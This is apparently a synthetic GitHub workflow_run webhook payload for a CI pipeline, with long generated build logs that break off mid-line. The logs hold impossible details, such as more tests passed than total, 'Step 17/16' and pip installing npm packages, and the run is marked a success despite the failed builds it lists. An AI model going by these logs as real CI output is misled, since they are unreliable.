{
  "action": "completed",
  "workflow_run": {
    "id": 28,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-649",
    "head_sha": "645441fe467b81a7cc1e35bac7c253d9a3090063",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-25T12:45:52.931373Z",
    "updated_at": "2025-11-25T12:49:54.791344Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: integration_tests ===\nBuilding Docker image...\n[12:45:52] INFO: Processing request\nLayer 8/15: ENV command\nCache hit for key-7713\nFetching submodules...\nnpm notice: package.json updated\nCache saved successfully\nStep 6/25: Testing\nWARNING: prettier has known vulnerabilities\nReady.\n[12:45:52] WARN: Deprecated API usage\nCreating production build...\nGET /health - 204 (49ms)\n\u2713 Step 'test' succeeded\nnpm notice: created a lockfile\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nImage pulled successfully\nnpm install: resolved 979 packages\n[12:45:52] INFO: Request completed\nStep 8/17: Building\nLoading...\nArtifact downloaded: 1MB\nTests: 491 passed, 287 total\nSuccess!\nStep 3/15: Running migrations\nCache invalidated: dependencies\n[12:45:52] INFO: Starting build process\nArtifact uploaded: dist.zip (13MB)\n[12:45:52] DEBUG: Query executed in 49ms\n[12:45:52] DEBUG: Initializing service\nWaiting...\nFetching submodules...\nWaiting...\n[12:45:52] INFO: Connecting to database\n[12:45:52] WARN: Deprecated API usage\nCache miss for key-2015\nUploading artifact 'dist' (27 files)\nTime: 117.14s\n\u2713 test completed\nTime: 67.403s\n[12:45:52] DEBUG: Query executed in 33ms\n[12:45:52] DEBUG: Loading configuration\nStep 19/25: Building\n  PASS: integration/test_db_connect.spec.js\npip: Installing build dependencies...\nCompiling utils/utils.go...\n[12:45:52] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: axios has known vulnerabilities\nConnection established\n[12:45:52] INFO: Processing request\npip install: Successfully installed webpack-2.16\npip install: Successfully installed axios-4.19\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/utils.go...\nDone.\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:45:52] INFO: Connecting to database\n\u2713 lint completed\nUsing Node.js 19.12.9\nTransforming 547 files...\nPulling image: alpine:18\nStep 18/24: Testing\n[12:45:52] DEBUG: Query executed in 44ms\nProcessing...\nLoading...\n[12:45:52] INFO: Connecting to database\nRan 23 tests in 31s\nNODE_ENV=test\n[12:45:52] WARN: Deprecated API usage\n[12:45:52] WARN: Deprecated API usage\n  PASS: test_auth_login (49ms)\nWARNING: axios has known vulnerabilities\nSuccess!\nStep 9/17: Running migrations\nArtifact uploaded: dist.zip (36MB)\n  PASS: e2e/test_cache_hit.spec.js\nException: RuntimeError\nConnection established\n[12:45:52] WARN: Deprecated API usage\nLayer 10/13: RUN command\n[12:45:52] INFO: Connecting to database\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (94ms)\nSnapshots: 12 passed, 26 total\nSwitched to branch 'hotfix/task-989'\nUsing Python 3.11\n\u2713 package completed\nCache invalidated: build\nException: ValueError\nPOST /upload - 200 (424ms)\n\u2713 Task completed in 4976ms\nProcessing...\nCompiling components/main.py...\nStep 5/20: Running migrations\nGenerating source maps...\n  PASS: test_auth_login (397ms)\nWARNING: react has known vulnerabilities\n[12:45:52] WARN: Deprecated API usage\nArtifact downloaded: 36MB\nFetching from https://githubusercontent.com/package.json\nnpm notice: created a lockfile\nCompiling utils/main.py...\nSuccess!\nOK\nStep 19/20: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 26 passed, 47 total\n\u2713 test completed\nConnection established\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\nCompiling src/app.ts...\n\u2713 Step 'test' succeeded\n\u2713 All checks passed\nCompiling lib/main.py...\nCompleted.\n[12:45:52] INFO: Cache refreshed\nException: NullPointerException\n  PASS: test_auth_login (42ms)\nOptimizing 37 modules...\nImage pulled successfully\nTLS handshake completed\nCache restored successfully (240MB)\n\u2713 test completed\nSwitched to branch 'hotfix/task-239'\nGET /status - 201 (30ms)\nStep 8/18: Running migrations\n[12:45:52] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (45MB)\nFinished.\nArtifact uploaded: dist.zip (85MB)\nOK\nPushing to registry...\nStep 17/16: Installing dependencies\nnpm install: added 21 packages\nWARNING: express has known vulnerabilities\n\u2713 validate completed\nCompiling lib/app.ts...\n  PASS: test_cache_hit (168ms)\n\u2713 Step 'checkout' succeeded\n[12:45:52] WARN: Deprecated API usage\nWaiting...\nWaiting...\nCache miss for key-7398\nMinifying app.js\nGET /status - 200 (86ms)\nPOST /data - 201 (279ms)\nStep 20/21: Running migrations\n\u2713 Step 'checkout' succeeded\nUploading artifact 'dist' (31 files)\nCache saved successfully\nProcessing...\n[12:45:52] ERROR: Connection failed\nOK\nFetching from https://npmjs.org/package.json\nBundling main.css\nCompleted.\nArtifact uploaded: build.tar.gz (45MB)\nInstalling lodash@3.16.5\nTests: 429 passed, 453 total\nPulling image: node:latest\npip: Installing build dependencies...\n[12:45:52] DEBUG: Loading configuration\n\u2713 deploy completed\n\u2713 All checks passed\nPushing to registry...\n[12:45:52] WARN: Deprecated API usage\nSuccess!\nDone.\n[12:45:52] DEBUG: Initializing service\nBundling styles.js\nBundling styles.js\n[12:45:52] DEBUG: Loading configuration\nAlready up to date.\npip install: Successfully installed eslint-5.5\nStep 5/15: Deploying\nArtifact downloaded: 50MB\n\u2713 test completed\nChecking out master branch\n\u2713 build completed\nSwitched to branch 'feature/task-137'\nProcessing...\nVerifying...\n\u2713 Step 'build' succeeded\n[12:45:52] DEBUG: Loading configuration\nStep 9/15: Running migrations\nStep 7/23: Testing\n[12:45:52] WARN: Deprecated API usage\nRan 125 tests in 48s\nTime: 59.678s\nSnapshots: 46 passed, 5 total\nCreating production build...\nCache hit for key-2435\n  PASS: test_cache_hit (180ms)\nStep 8/18: Running migrations\nStep 20/20: Running migrations\nWARNING: lodash has known vulnerabilities\n[12:45:52] WARN: Deprecated API usage\n\u2713 Task completed in 579ms\n\u2713 All checks passed\nNODE_ENV=test\nnpm notice: package.json updated\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 17/18: Running migrations\n\u2713 All checks passed\nTLS handshake completed\nConnection established\nArtifact uploaded: build.tar.gz (43MB)\nGenerating source maps...\nOptimizing 23 modules...\nCreating production build...\nHEAD is now at 6ec0ebe\n[12:45:52] WARN: Deprecated API usage\nnpm notice: created a lockfile\nyarn add: Done in 16.52s\n[12:45:52] INFO: Cache refreshed\nCoverage: 70% statements, 95% branches\nCache restored successfully (151MB)\n[12:45:52] INFO: Connecting to database\nOK\nStep 10/18: Linting\nImage pulled successfully\nnpm install: resolved 875 packages\nEnvironment: production\nMinifying main.js\n[12:45:52] INFO: Processing request\npip: Downloading eslint-3.12.tar.gz\nLoading...\npip install: Successfully installed axios-1.2\nWaiting...\nFetching submodules...\nNODE_ENV=test\nUsing Python 3.11\n[12:45:52] DEBUG: Loading configuration\nProcessing...\nRan 106 tests in 43s\n[12:45:52] INFO: Request completed\nWARNING: react has known vulnerabilities\nPushing to registry...\nCache restored successfully (27MB)\nStep 18/17: Deploying\nBuilding Docker image...\n[12:45:52] DEBUG: Query executed in 27ms\npip: Collecting express\nCompiling utils/service.java...\nNODE_ENV=development\nCompleted.\npip install: Successfully installed jest-5.11\nCache invalidated: dependencies\npip: Downloading prettier-4.9.tar.gz\nnpm install: resolved 316 packages\nStep 19/20: Installing dependencies\nConnection established\nOptimizing 82 modules...\nStep 13/20: Testing\nException: NullPointerException\nSuccess!\nFAILED: test_user_create\nUploading artifact 'dist' (49 files)\nOptimizing 85 modules...\nCompleted.\nTLS handshake completed\nFinished.\npip: Downloading express-4.8.tar.gz\nUsing Python 3.11\nPulling image: python:latest\nArtifact uploaded: build.tar.gz (18MB)\nFAILED: test_cache_hit\nVerifying...\nnpm notice: created a lockfile\nTest Suites: 23 passed, 31 total\nArtifact uploaded: dist.zip (98MB)\nBundling vendor.js\nStep 17/25: Testing\nChecking out master branch\nUsing Node.js 15.14.9\nCompiling components/main.py...\nEnvironment: development\nStep 16/22: Building\nyarn add: Done in 18.49s\n[12:45:52] DEBUG: Memory usage: 531MB\nArtifact uploaded: dist.zip (67MB)\nStep 15/15: Running migrations\nLoading...\npip: Collecting express\nCache restored successfully (431MB)\npip: Collecting express\n[12:45:52] INFO: Connecting to database\n[12:45:52] DEBUG: Memory usage: 1358MB\n\u2713 Task completed in 392ms\nPOST /api - 201 (28ms)\n  PASS: unit/test_cache_hit.spec.js\nnpm notice: package.json updated\nTests: 194 passed, 114 total\nStep 20/20: Building\nSuccess!\nStep 4/19: Deploying\nDone.\nnpm install: added 65 packages\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache saved successfully\nCompiling lib/index.js...\nGenerating source maps...\npip install: Successfully installed eslint-5.14\nNODE_ENV=production\nGET /api - 201 (88ms)\nCache hit for key-9360\nStep 13/17: Installing dependencies\nFetching from https://gcr.io/package.json\nCache hit for key-7172\n[12:45:52] INFO: Connecting to database\nWARNING: express has known vulnerabilities\nNODE_ENV=production\n[12:45:52] INFO: Connecting to database\nWaiting...\nStep 9/24: Linting\nRan 50 tests in 41s\n[12:45:52] INFO: Request completed\nCache invalidated: dependencies\nGenerating source maps...\nWARNING: react has known vulnerabilities\n[12:45:52] INFO: Processing request\n\u2713 Task completed in 1378ms\nTest Suites: 32 passed, 35 total\n[12:45:52] WARN: Deprecated API usage\nCompiling lib/handler.rs...\nProcessing...\npip: Installing build dependencies...\nWARNING: lodash has known vulnerabilities\n[12:45:52] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nTests: 53 passed, 238 total\n[12:45:52] DEBUG: Memory usage: 169MB\nVerifying...\nRan 124 tests in 31s\n[12:45:52] DEBUG: Loading configuration\nConnection established\n[12:45:52] WARN: Deprecated API usage\npip: Downloading express-5.11.tar.gz\nCreating production build...\nCompiling components/main.py...\nWARNING: react has known vulnerabilities\nStep 5/15: Building\nConnection established\nAlready up to date.\n[12:45:52] DEBUG: Connection pool: 8 active\nStep 13/21: Running migrations\nTest Suites: 24 passed, 26 total\nFAILED: test_db_connect\npip: Collecting express\nStep 6/22: Installing dependencies\nOK\n[12:45:52] INFO: Connecting to database\n\u2713 All checks passed\nCache hit for key-8304\n\u2713 Step 'setup' succeeded\nUsing Node.js 18.20.5\nFetching submodules...\nDone.\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:52] DEBUG: Loading configuration\nnpm install: added 136 packages\nGenerating source maps...\nTime: 19.991s\nStep 4/15: Installing dependencies\nOptimizing 89 modules...\n[12:45:52] DEBUG: Loading configuration\nUsing Python 3.11\nConnection established\n[12:45:52] INFO: Cache refreshed\n[12:45:52] ERROR: Connection failed\n[12:45:52] INFO: Request completed\nSwitched to branch 'feature/task-283'\n\u2713 test completed\nLayer 2/10: COPY command\n[12:45:52] ERROR: Connection failed\npip: Downloading prettier-1.2.tar.gz\n\u2717 build failed with exit code 95\nCoverage: 99% statements, 72% branches\nAlready up to date.\nSnapshots: 23 passed, 35 total\nCache restored successfully (199MB)\nAlready up to date.\nGET /api - 201 (100ms)\nOK\nBuilding Docker image...\nBundling vendor.css\nnpm install: resolved 452 packages\nOptimizing 58 modules...\nRan 169 tests in 23s\nUsing Python 3.12\n[12:45:52] WARN: Deprecated API usage\nLayer 9/13: COPY command\nCompiling components/index.js...\nCache invalidated: node_modules\nGenerating source maps...\nTLS handshake completed\n[12:45:52] INFO: Cache refreshed\nConnection established\nConnection established\n  PASS: unit/test_db_connect.spec.js\nFetching from https://github.com/package.json\n\u2713 build completed\nWaiting...\nnpm notice: created a lockfile\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\nCompleted.\nBuilding Docker image...\nCache saved successfully\nWARNING: eslint has known vulnerabilities\nCompiling src/service.java...\nOptimizing 83 modules...\n[12:45:52] INFO: Cache refreshed\nTLS handshake completed\nCompiling src/index.js...\nFAILED: test_cache_hit\nOptimizing 31 modules...\n[12:45:52] INFO: Cache refreshed\nnpm notice: package.json updated\n[12:45:52] DEBUG: Memory usage: 936MB\nCache miss for key-4264\n[12:45:52] WARN: Deprecated API usage\nCompiling components/index.js...\nSuccess!\nImage pulled successfully\nPlatform: linux-x64\n[12:45:52] INFO: Request completed\nLoading...\nTransforming 923 files...\nyarn add: Done in 14.99s\nGET /api - 201 (15ms)\nImage pulled successfully\npip: Downloading express-1.13.tar.gz\nTests: 191 passed, 197 total\nPulling image: alpine:18\nInstalling eslint@3.12.0\nReady.\nTest Suites: 9 passed, 40 total\n\u2713 All checks passed\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\nTLS handshake completed\nTests: 172 passed, 187 total\nBuilding Docker image...\nCompiling lib/app.ts...\n[12:45:52] INFO: Cache refreshed\nGenerating source maps...\nUploading artifact 'coverage' (18 files)\nStep 14/15: Linting\nWaiting...\nDone.\npip: Installing build dependencies...\nTests: 180 passed, 69 total\nPulling image: python:3.11\nVerifying...\n[12:45:52] DEBUG: Connection pool: 10 active\nnpm notice: created a lockfile\nChecking out main branch\nBundling styles.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out main branch\nRan 38 tests in 60s\nFAILED: test_auth_login\nCache hit for key-4914\nRan 116 tests in 16s\nPOST /upload - 202 (402ms)\nSuccess!\nCompiling src/service.java...\nBundling main.js\nOK\nFetching from https://docker.io/package.json\nCreating production build...\nTime: 30.328s\nOptimizing 16 modules...\nUsing Node.js 15.15.3\nnpm install: added 392 packages\n\u2717 build failed with exit code 80\n[12:45:52] INFO: Request completed\n  PASS: test_db_connect (239ms)\n\u2713 Task completed in 4717ms\nArtifact uploaded: build.tar.gz (25MB)\nLoading...\nInstalling eslint@5.15.6\nEnvironment: staging\n\u2713 All checks passed\nnpm notice: created a lockfile\n[12:45:52] INFO: Cache refreshed\npip: Collecting jest\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache saved successfully\n[12:45:52] DEBUG: Query executed in 32ms\nTests: 449 passed, 94 total\nPlatform: linux-x64\nBuilding Docker image...\nImage pulled successfully\n\u2717 build failed with exit code 22\nReady.\nLayer 1/13: COPY command\n[12:45:52] DEBUG: Connection pool: 10 active\nBundling vendor.css\nCompiling components/handler.rs...\nLayer 2/8: RUN command\n[12:45:52] INFO: Connecting to database\n[12:45:52] INFO: Processing request\nCache miss for key-7292\nProcessing...\nSuccess!\nGenerating source maps...\nAlready up to date.\n  PASS: unit/test_db_connect.spec.js\n  PASS: e2e/test_cache_hit.spec.js\npip: Installing build dependencies...\nWARNING: jest has known vulnerabilities\n\u2713 test completed\nCreating production build...\nUploading artifact 'build' (42 files)\nSnapshots: 46 passed, 25 total\nCache restored successfully (460MB)\n\u2713 Step 'test' succeeded\nGenerating source maps...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 19/22: Installing dependencies\npip: Downloading prettier-1.13.tar.gz\n\u2713 All checks passed\nUsing Node.js 18.19.0\nWARNING: webpack has known vulnerabilities\nStep 3/19: Deploying\nnpm notice: created a lockfile\n[12:45:52] DEBUG: Query executed in 71ms\nChecking out master branch\nInstalling jest@1.11.6\nArtifact uploaded: dist.zip (45MB)\nReady.\nReady.\n[12:45:52] INFO: Connecting to database\nWARNING: eslint has known vulnerabilities\n[12:45:52] WARN: Deprecated API usage\nGET /api - 204 (80ms)\nConnection established\nCache hit for key-2049\nLayer 1/14: COPY command\n[12:45:52] DEBUG: Initializing service\nUploading artifact 'build' (3 files)\nStep 14/22: Installing dependencies\nStep 14/16: Installing dependencies\nArtifact uploaded: dist.zip (93MB)\nVerifying...\nOptimizing 52 modules...\nDone.\n[12:45:52] INFO: Request completed\nEnvironment: staging\nException: ValueError\nWaiting...\nCache saved successfully\nFinished.\nCompiling src/service.java...\nUploading artifact 'coverage' (47 files)\nOK\nCompiling lib/app.ts...\nStep 6/21: Installing dependencies\nLayer 2/14: COPY command\nStep 16/22: Linting\n[12:45:52] DEBUG: Connection pool: 12 active\n[12:45:52] DEBUG: Connection pool: 13 active\npip install: Successfully installed eslint-4.2\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 9/25: Installing dependencies\nTest Suites: 34 passed, 45 total\n  PASS: test_db_connect (416ms)\nFetching from https://amazonaws.com/package.json\nHEAD is now at c6229ae\nnpm notice: package.json updated\nChecking out main branch\nCompiling lib/main.py...\nUploading artifact 'dist' (14 files)\nnpm notice: package.json updated\nEnvironment: development\nOK\nCreating production build...\nArtifact uploaded: build.tar.gz (16MB)\nEnvironment: production\nCompiling components/service.java...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOptimizing 36 modules...\n[12:45:52] INFO: Request completed\n[12:45:52] INFO: Request completed\nUploading artifact 'dist' (11 files)\nOptimizing 70 modules...\nStep 5/22: Installing dependencies\nGenerating source maps...\nOptimizing 46 modules...\nStep 17/25: Linting\nGenerating source maps...\nTest Suites: 28 passed, 42 total\nArtifact downloaded: 15MB\nCache saved successfully\nCache hit for key-3199\nMinifying app.js\n\u2713 All checks passed\npip install: Successfully installed express-4.12\npip: Installing build dependencies...\nCache hit for key-5887\nnpm notice: created a lockfile\nStep 6/24: Building\nPushing to registry...\nStep 2/23: Linting\nRan 130 tests in 40s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\n=== Step deploy_production completed ===\n=== Step: type_check ===\nDone.\nStep 14/16: Building\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (7MB)\nBundling styles.css\nyarn add: Done in 13.62s\nTest Suites: 38 passed, 33 total\nBundling runtime.js\nDone.\nConnection established\nGenerating source maps...\nCache restored successfully (259MB)\nCache miss for key-5319\nDone.\n[12:45:52] WARN: Deprecated API usage\n\u2713 Step 'setup' succeeded\npip: Collecting webpack\nFetching submodules...\nBundling styles.css\nPOST /data - 200 (172ms)\nDone.\n[12:45:52] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTests: 179 passed, 333 total\nCache invalidated: dependencies\nConnection established\nStep 4/19: Linting\nPushing to registry...\nSnapshots: 24 passed, 19 total\nBuilding Docker image...\n\u2713 validate completed\nNODE_ENV=test\nTransforming 248 files...\nProcessing...\nCache invalidated: node_modules\nTransforming 136 files...\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1108\nPulling image: python:latest\nAlready up to date.\n[12:45:52] WARN: Deprecated API usage\nMinifying app.js\nnpm notice: created a lockfile\n  PASS: test_user_create (168ms)\nCache hit for key-8700\n\u2713 Step 'test' succeeded\n[12:45:52] WARN: Deprecated API usage\nPushing to registry...\nGET /api - 204 (59ms)\nCoverage: 75% statements, 75% branches\nGET /status - 201 (64ms)\n[12:45:52] WARN: Deprecated API usage\n[12:45:52] WARN: Deprecated API usage\nCompiling lib/main.py...\nCache saved successfully\nSwitched to branch 'feature/task-934'\nUsing Node.js 14.1.10\nFetching submodules...\n\u2713 All checks passed\nStep 11/24: Running migrations\npip: Installing build dependencies...\nStep 15/19: Deploying\nImage pulled successfully\nArtifact downloaded: 5MB\n[12:45:52] DEBUG: Memory usage: 1044MB\nPulling image: alpine:latest\nRan 142 tests in 44s\nStep 15/20: Deploying\nArtifact downloaded: 47MB\nCompleted.\nCreating production build...\nUsing Node.js 18.20.2\nWARNING: eslint has known vulnerabilities\nConnection established\nStep 4/15: Building\nTLS handshake completed\n  PASS: integration/test_user_create.spec.js\nPushing to registry...\nOptimizing 12 modules...\nNODE_ENV=development\nCache restored successfully (391MB)\nCompiling lib/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /upload - 200 (147ms)\n[12:45:52] DEBUG: Connection pool: 10 active\npip: Downloading react-2.2.tar.gz\n\u2713 test completed\nPushing to registry...\nCompleted.\nyarn add: Done in 16.97s\nStep 17/23: Testing\nTransforming 171 files...\npip: Installing build dependencies...\nPOST /data - 200 (424ms)\nWARNING: jest has known vulnerabilities\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 16/23: Linting\n\u2713 Step 'setup' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nBuilding Docker image...\nCache saved successfully\nTLS handshake completed\nCache restored successfully (129MB)\nBundling styles.js\nCompiling components/main.py...\nCache invalidated: node_modules\n[12:45:52] DEBUG: Connection pool: 11 active\nUsing Python 3.10\nHEAD is now at c5aa93c\nArtifact uploaded: dist.zip (64MB)\npip install: Successfully installed webpack-1.3\n[12:45:52] INFO: Cache refreshed\nnpm notice: created a lockfile\n\u2717 build failed with exit code 50\nGET /health - 200 (92ms)\nArtifact uploaded: build.tar.gz (27MB)\nnpm notice: created a lockfile\nProcessing...\nnpm notice: created a lockfile\nCompiling src/main.py...\nReady.\npip: Installing build dependencies...\nCache hit for key-9377\nCreating production build...\npip: Collecting prettier\nLoading...\nFinished.\npip install: Successfully installed webpack-5.7\nArtifact uploaded: dist.zip (64MB)\nRan 49 tests in 14s\nInstalling react@5.20.2\n[12:45:52] DEBUG: Loading configuration\nAlready up to date.\n[12:45:52] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (41MB)\nGenerating source maps...\nVerifying...\nCache saved successfully\nCache invalidated: build\nTest Suites: 10 passed, 36 total\nArtifact uploaded: dist.zip (37MB)\nVerifying...\nArtifact downloaded: 44MB\nRan 69 tests in 9s\nImage pulled successfully\n  PASS: test_db_connect (334ms)\nReady.\nReady.\n[12:45:52] DEBUG: Connection pool: 9 active\nCoverage: 92% statements, 72% branches\nOK\nReady.\nWaiting...\nArtifact downloaded: 50MB\nUsing Node.js 14.17.6\nLoading...\n[12:45:52] INFO: Request completed\nStep 14/25: Building\nStep 3/15: Testing\nOptimizing 34 modules...\nArtifact uploaded: dist.zip (28MB)\nEnvironment: test\npip: Installing build dependencies...\n[12:45:52] INFO: Request completed\nProcessing...\nTest Suites: 12 passed, 47 total\nCompiling utils/handler.rs...\n  PASS: test_cache_hit (33ms)\nStep 9/19: Building\nWARNING: lodash has known vulnerabilities\nCache invalidated: node_modules\npip install: Successfully installed axios-2.6\n[12:45:52] DEBUG: Loading configuration\n[12:45:52] INFO: Starting build process\nUsing Node.js 14.18.9\nImage pulled successfully\n[12:45:52] DEBUG: Initializing service\n\u2713 deploy completed\nCompiling utils/index.js...\n\u2713 Task completed in 851ms\nLoading...\n  PASS: integration/test_api_health.spec.js\nVerifying...\nConnection established\nFetching from https://npmjs.org/package.json\nStep 4/19: Linting\n[12:45:52] DEBUG: Loading configuration\n[12:45:52] INFO: Connecting to database\npip: Collecting axios\nTime: 100.76s\nFetching from https://registry.npmjs.org/package.json\nStep 3/17: Building\nLayer 10/14: COPY command\nCache hit for key-8082\nStep 5/21: Running migrations\nAlready up to date.\nDone.\n[12:45:52] WARN: Deprecated API usage\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (3MB)\nNODE_ENV=test\nFinished.\n=== Step type_check completed ===\n=== Step: build ===\nUploading artifact 'build' (21 files)\nSnapshots: 17 passed, 11 total\nCreating production build...\nnpm install: added 436 packages\nNODE_ENV=development\nPulling image: python:18\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSwitched to branch 'feature/task-515'\nWaiting...\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\n[12:45:52] DEBUG: Loading configuration\n\u2713 All checks passed\nnpm install: resolved 767 packages\n  PASS: unit/test_api_health.spec.js\nBuilding Docker image...\nCompiling lib/utils.go...\nCache miss for key-3804\nWARNING: webpack has known vulnerabilities\n[12:45:52] WARN: Deprecated API usage\n[12:45:52] WARN: Deprecated API usage\nImage pulled successfully\nBuilding Docker image...\nyarn add: Done in 13.76s\n[12:45:52] DEBUG: Connection pool: 18 active\nSnapshots: 13 passed, 16 total\nCompleted.\nTests: 481 passed, 282 total\nFetching from https://gcr.io/package.json\nSwitched to branch 'bugfix/task-931'\n[12:45:52] DEBUG: Loading configuration\nFetching from https://npmjs.org/package.json\npip: Installing build dependencies...\nnpm notice: package.json updated\nVerifying...\nnpm notice: created a lockfile\nEnvironment: production\nSnapshots: 45 passed, 3 total\nCache hit for key-6469\nPOST /api - 202 (276ms)\nGET /status - 201 (76ms)\nTLS handshake completed\nCompiling components/index.js...\nUsing Python 3.12\nCache miss for key-7973\nStep 12/23: Linting\nUploading artifact 'build' (43 files)\nFetching from https://docker.io/package.json\nWaiting...\nStep 9/23: Testing\nPOST /upload - 200 (70ms)\nCompiling components/app.ts...\nnpm install: added 131 packages\nOptimizing 78 modules...\nAlready up to date.\nSnapshots: 41 passed, 11 total\nOptimizing 74 modules...\nUsing Node.js 17.2.8\nCache miss for key-8746\nMinifying vendor.js\nReady.\nSnapshots: 5 passed, 30 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\n[12:45:52] DEBUG: Memory usage: 1920MB\nCompiling src/index.js...\nCache saved successfully\nnpm notice: created a lockfile\nDone.\nFetching submodules...\nCompiling utils/utils.go...\nVerifying...\nBuilding Docker image...\nRan 37 tests in 35s\n[12:45:52] ERROR: Connection failed\nCache saved successfully\nCompiling lib/service.java...\nLayer 10/15: RUN command\nWaiting...\nMinifying main.js\nCompleted.\nCompiling lib/utils.go...\nCompiling utils/handler.rs...\nBuilding Docker image...\nStep 20/21: Building\nCache invalidated: build\nPushing to registry...\nGenerating source maps...\n[12:45:52] INFO: Cache refreshed\nnpm notice: package.json updated\nFetching submodules...\nStep 16/17: Installing dependencies\n\u2713 All checks passed\nTLS handshake completed\nWARNING: jest has known vulnerabilities\nAlready up to date.\nnpm notice: created a lockfile\nTest Suites: 35 passed, 7 total\n\u2713 validate completed\nTest Suites: 7 passed, 29 total\n\u2713 All checks passed\nTest Suites: 18 passed, 37 total\n\u2713 All checks passed\nCompiling utils/service.java...\npip install: Successfully installed prettier-3.7\nCache invalidated: dependencies\nSuccess!\nCache hit for key-2732\nConnection established\nRan 136 tests in 15s\nGET /health - 200 (80ms)\nArtifact downloaded: 40MB\nTests: 301 passed, 144 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:52] INFO: Starting build process\nLayer 5/15: RUN command\nWARNING: react has known vulnerabilities\nnpm install: added 343 packages\nUsing Node.js 18.9.10\nCompiling utils/handler.rs...\nCompleted.\nHEAD is now at e2637bf\nOptimizing 14 modules...\nCompleted.\nnpm install: added 399 packages\n[12:45:52] INFO: Starting build process\nCompiling components/main.py...\nnpm install: added 254 packages\nStep 18/15: Running migrations\nPushing to registry...\nTests: 164 passed, 401 total\nArtifact downloaded: 33MB\nyarn add: Done in 11.11s\nWaiting...\nCache saved successfully\nPOST /data - 202 (49ms)\nWARNING: axios has known vulnerabilities\npip: Downloading react-1.11.tar.gz\nnpm notice: created a lockfile\nChecking out develop branch\n[12:45:52] INFO: Starting build process\n[12:45:52] DEBUG: Connection pool: 6 active\n\u2713 deploy completed\nnpm install: resolved 1878 packages\n[12:45:52] DEBUG: Memory usage: 977MB\nWaiting...\nSnapshots: 4 passed, 17 total\nGET /health - 200 (7ms)\nPulling image: node:18\nFinished.\nUploading artifact 'dist' (28 files)\nRan 46 tests in 27s\n\u2713 Task completed in 3641ms\nCompiling components/main.py...\nBundling styles.js\nEnvironment: staging\nReady.\nWaiting...\nDone.\nException: NullPointerException\nTransforming 412 files...\nCompiling lib/utils.go...\nProcessing...\nStep 16/16: Installing dependencies\nReady.\nCoverage: 82% statements, 92% branches\nCompiling src/service.java...\nStep 20/22: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTLS handshake completed\nStep 7/15: Installing dependencies\n\u2713 Step 'checkout' succeeded\nCache hit for key-3735\nTransforming 280 files...\nUsing Python 3.10\nReady.\nWARNING: react has known vulnerabilities\nProcessing...\n  PASS: integration/test_cache_hit.spec.js\nCompiling lib/app.ts...\n\u2713 deploy completed\n[12:45:52] DEBUG: Query executed in 36ms\nEnvironment: test\nStep 2/25: Deploying\nCache hit for key-9106\nArtifact downloaded: 7MB\nnpm install: added 247 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/15: Running migrations\nCache saved successfully\nBundling runtime.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTests: 64 passed, 497 total\nPushing to registry...\n[12:45:52] INFO: Request completed\nHEAD is now at 3b459f2\nWARNING: jest has known vulnerabilities\nFetching submodules...\nAlready up to date.\nVerifying...\npip: Installing build dependencies...\n[12:45:52] DEBUG: Initializing service\n  PASS: test_user_create (231ms)\n\u2713 Task completed in 2765ms\nConnection established\n=== Step build completed ===\n=== Step: restore_cache ===\n\u2713 validate completed\nWaiting...\nCache invalidated: node_modules\nPOST /upload - 200 (235ms)\nWARNING: webpack has known vulnerabilities\nGenerating source maps...\n[12:45:52] DEBUG: Memory usage: 1240MB\nFAILED: test_cache_hit\n[12:45:52] DEBUG: Memory usage: 1189MB\n[12:45:52] INFO: Connecting to database\nnpm install: added 177 packages\nWARNING: eslint has known vulnerabilities\n[12:45:52] INFO: Cache refreshed\nTests: 466 passed, 222 total\nArtifact downloaded: 6MB\nHEAD is now at 64e90dc\nException: TypeError\npip install: Successfully installed lodash-4.5\nArtifact uploaded: dist.zip (38MB)\nArtifact uploaded: build.tar.gz (2MB)\n[12:45:52] WARN: Deprecated API usage\npip: Downloading react-2.16.tar.gz\nyarn add: Done in 